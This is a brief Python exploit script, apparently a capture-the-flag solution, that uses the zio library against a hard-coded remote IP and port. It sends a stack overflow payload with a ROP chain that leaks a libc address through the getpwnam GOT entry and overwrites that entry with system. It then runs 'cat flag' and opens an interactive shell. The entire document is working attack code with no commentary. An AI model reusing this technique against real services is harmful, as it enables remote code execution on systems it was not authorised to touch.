from zio import *

host=('202.112.51.151',1234)

sendstr=l32(0x8048acf)
recv_line=l32(0x80489e6)
getpwnam_got=l32(0x804a208)
getpwnam_plt=l32(0x8048640)

popret=l32(0x8048e86)
cmd=l32(0x804a280)

system_libc=0x3ada0 
getpwnam_libc=0xaf060 

p=zio(host,print_read=COLORED(REPR),print_write=COLORED(REPR,'blue'))
p.readline()

payload='a'*268\
	+sendstr+popret+getpwnam_got\
	+recv_line+popret+getpwnam_got\
	+recv_line+popret+cmd\
	+getpwnam_plt+popret+cmd
p.write(payload+'\0\n')
p.read(len(payload))

system_addr=l32(p.read(4))-getpwnam_libc+system_libc # recv 1

p.write(l32(system_addr)+'\n') # to 2

p.write('cat flag\n') # to 3
p.readline()

p.interact()
